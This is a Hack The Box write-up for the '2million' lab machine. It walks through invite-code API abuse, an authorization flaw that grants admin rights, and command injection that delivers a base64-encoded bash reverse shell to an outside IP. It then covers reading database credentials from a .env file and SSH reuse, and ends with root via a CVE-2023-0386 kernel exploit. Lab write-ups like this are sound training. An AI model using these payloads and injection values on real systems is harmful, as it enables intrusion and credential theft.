# Hack The Box – **2million**

**Difficulty:** Medium
**Focus:** Web API abuse → Credential reuse → Admin privilege abuse → Kernel privilege escalation
**OS:** Ubuntu 22.04 (Kernel 5.15.70)
**Initial Access:** Web API → Reverse shell
**Privilege Escalation:** CVE-2023-0386 (OverlayFS / FUSE)

---

## 1. Reconnaissance

### 1.1 Network & Services

```bash
nmap -A 10.129.4.218
```

**Open Ports**

* `22/tcp` – OpenSSH
* `80/tcp` – nginx

Hostname discovered:

```bash
2million.htb
```

Added to `/etc/hosts`.

---

## 2. Web Enumeration

### 2.1 Directory Discovery

```bash
gobuster dir -u http://2million.htb -w /usr/share/wordlists/dirb/common.txt -b 301
```

**Interesting endpoints**

```
/api
/invite
/login
/register
```

---

## 3. API Enumeration & Invite Code Abuse

### 3.1 Discover Invite Mechanism

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

Response indicated **ROT13** encryption.

Decoded message:

```bash
Use POST request to /api/v1/invite/generate
```

### 3.2 Generate Invite Code

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

Returned Base64 string → decoded:

```bash
V8SB2-26HVG-D3BED-HET9A
```

### 3.3 Register User

Registered account:

```
username: slamdad
```

---

## 4. API Abuse → Admin Privilege Escalation (Web)

### 4.1 Enumerate API Routes

```bash
curl http://2million.htb/api/v1 --cookie "PHPSESSID=..."
```

Discovered:

```
PUT /api/v1/admin/settings/update
```

### 4.2 Check Auth Status

```bash
curl http://2million.htb/api/v1/user/auth
```

Output:

```json
{
  "loggedin": true,
  "username": "slamdad",
  "is_admin": 0
}
```

### 4.3 Privilege Escalation via API (IDOR / Missing Authorization)

```bash
curl -X PUT \
-H "Content-Type: application/json" \
-b "PHPSESSID=..." \
-d '{"email":"test@test.com","is_admin":1}' \
http://2million.htb/api/v1/admin/settings/update
```

Response:

```json
{"username":"slamdad","is_admin":1}
```

Confirmed:

```bash
curl http://2million.htb/api/v1/admin/auth
```

---

## 5. Command Injection → Reverse Shell (www-data)

### 5.1 Vulnerable Endpoint

```bash
POST /api/v1/admin/vpn/generate
```

### 5.2 Proof of Command Execution

```bash
-d '{"username":"test;whoami;"}'
```

Response:

```
www-data
```

### 5.3 Reverse Shell Payload

Listener:

```bash
nc -lvnp 4444
```

Payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.16.170/4444 0>&1' | base64
```

Injected:

```bash
-d '{"username":"test;echo BASE64 | base64 -d | bash;"}'
```

Shell received as:

```
www-data@2million
```

---

## 6. Local Enumeration → Credential Discovery

### 6.1 Web Directory

```bash
/var/www/html
```

Found:

```bash
.env
```

```env
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

---

## 7. Lateral Movement → User Shell (admin)

```bash
ssh to admin as ssh is open 
ssh admin@ip 
password : SuperDuperPass123
```

### 7.1 User Flag

```bash
cat ~/user.txt
```

---

## 8. Privilege Escalation Enumeration

### 8.1 Kernel Version

```bash
uname -a
```

```
Linux 5.15.70-051570-generic
```

### 8.2 Local Mail Hint

```bash
cat /var/mail/admin
```

Mail referenced:

> “That one in OverlayFS / FUSE looks nasty”

This pointed directly to **CVE-2023-0386**.

---

## 9. Privilege Escalation → Root (CVE-2023-0386)

### 9.1 Upload Exploit

Transferred `CVE-2023-0386` exploit to `/tmp`.

### 9.2 Compile

```bash
make all
```

### 9.3 Execute Exploit

```bash
./fuse ./ovlcap/lower ./gc &
./exp
```

Result:

```bash
uid=0(root) gid=0(root)
```

Root shell achieved.

---

## 10. Root Flag

```bash
cat /root/root.txt
```

---

## 11. Summary of Attack Chain

| Stage                      | Technique                       |
| -------------------------- | ------------------------------- |
| Initial Access             | API invite abuse                |
| Privilege Escalation (Web) | IDOR / Missing authorization    |
| RCE                        | Command injection               |
| Credential Access          | `.env` leakage                  |
| Lateral Movement           | Credential reuse                |
| Root Escalation            | Kernel exploit (OverlayFS/FUSE) |

---

## 12. Key Takeaways

* Never trust client-side role checks
* Admin APIs must enforce authorization server-side
* `.env` files must never be web-accessible
* Kernel patching is **not optional**


